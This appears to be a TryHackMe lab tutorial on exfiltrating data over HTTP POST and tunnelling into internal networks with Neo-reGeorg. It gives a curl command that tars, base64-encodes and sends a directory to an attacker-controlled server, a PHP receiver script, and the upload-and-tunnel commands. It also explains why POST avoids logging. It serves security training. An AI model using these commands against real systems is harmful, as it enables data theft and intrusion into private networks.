# Data Exfiltration Using HTTP/HTTPS

Before proceeding, ensure you have a fundamental understanding of network protocols.

This guide explains how to use the HTTP/HTTPS protocol to exfiltrate data from a victim to an attacker's machine. The attacker requires control over a web server with a server-side programming language installed. This example uses PHP, but other languages like Python, Golang, or NodeJS can also be used.

---

## HTTP POST Request

Exfiltrating data through HTTP is challenging to detect due to its similarity to legitimate traffic. The POST method is preferred over GET because:

- POST requests are not cached.
- POST requests do not appear in browser history.
- POST requests cannot be bookmarked.
- POST requests have no restrictions on data length.

### Example: Inspecting Apache Logs

```bash
thm@jump-box:~$ ssh thm@web.thm.com
thm@web-thm:~$ sudo cat /var/log/apache2/access.log
[sudo] password for thm:
10.10.198.13 - - [22/Apr/2022:12:03:11 +0100] "GET /example.php?file=dGhtOnRyeWhhY2ttZQo= HTTP/1.1" 200 147 "-" "curl/7.68.0"
10.10.198.13 - - [22/Apr/2022:12:03:25 +0100] "POST /example.php HTTP/1.1" 200 147 "-" "curl/7.68.0"
```

- The GET request logs the `file` parameter with base64-encoded data (`thm:tryhackme`).
- The POST request does not log the transmitted data.

---

## HTTP Data Exfiltration Steps

1. **Set up a web server with a data handler**:
    - Example PHP handler:
      ```php
      <?php 
      if (isset($_POST['file'])) {
            $file = fopen("/tmp/http.bs64", "w");
            fwrite($file, $_POST['file']);
            fclose($file);
      }
      ?>
      ```

2. **Send data using `curl`**:
    ```bash
    thm@victim1:~$ curl --data "file=$(tar zcf - task6 | base64)" http://web.thm.com/contact.php
    ```

3. **Verify data on the web server**:
    ```bash
    thm@web:~$ ls -l /tmp/
    -rw-r--r-- 1 www-data www-data 247 Apr 12 16:03 http.bs64
    ```

4. **Fix base64 encoding**:
    ```bash
    thm@web:~$ sudo sed -i 's/ /+/g' /tmp/http.bs64
    ```

5. **Restore the data**:
    ```bash
    thm@web:~$ cat /tmp/http.bs64 | base64 -d | tar xvfz -
    ```

---

## HTTPS Communications

Using HTTPS encrypts transmitted data with SSL keys. This makes it harder to inspect traffic, as shown in the Wireshark capture below.

---

## HTTP Tunneling

HTTP tunneling encapsulates other protocols within HTTP requests. This is useful for accessing internal networks from the Internet.

### Example: HTTP Tunnel with Neo-reGeorg

1. **Generate encrypted tunneling clients**:
    ```bash
    root@AttackBox:/opt/Neo-reGeorg# python3 neoreg.py generate -k thm
    ```

2. **Upload the client (e.g., `tunnel.php`) to the victim server**.

3. **Establish the tunnel**:
    ```bash
    root@AttackBox:/opt/Neo-reGeorg# python3 neoreg.py -k thm -u http://10.10.82.84/uploader/files/tunnel.php
    ```

4. **Access internal devices**:
    ```bash
    root@AttackBox:~$ curl --socks5 127.0.0.1:1080 http://172.20.0.121:80
    ```

---

Replicate these steps to establish a tunnel to communicate with `flag.thm.com` (IP: `172.20.0.120`, Port: `80`).